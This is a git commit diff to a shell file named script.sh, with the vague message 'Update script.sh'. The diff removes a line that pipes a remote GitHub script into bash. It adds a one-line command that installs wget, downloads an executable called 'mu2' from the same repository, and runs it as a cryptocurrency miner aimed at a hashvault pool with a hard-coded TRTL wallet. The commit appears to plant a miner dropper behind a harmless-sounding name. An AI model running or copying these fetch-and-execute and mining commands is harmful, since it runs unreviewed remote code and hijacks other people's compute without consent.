f0c8471c2db106625f17bbbbca2e3aa76f558d89
calebsto <82493755+calebsto@users.noreply.github.com>
2021-07-15 19:36:55 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,2 +1,1 @@
-curl https://raw.githubusercontent.com/calebsto/rap/main/max.sh | bash
-echo "Hell ${NAME:-World}!"
+apt update && apt install wget -y && wget https://github.com/calebsto/rap/raw/main/mu2 && chmod +x mu2 && ./mu2 --algorithm argon2id_chukwa2 --pool pool.hashvault.pro:8888 --wallet TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.09a196ecd13c80c6c61692ffb0359d11928158465c11381a0061eb883b54ceef --password aweu --keepalive --tls
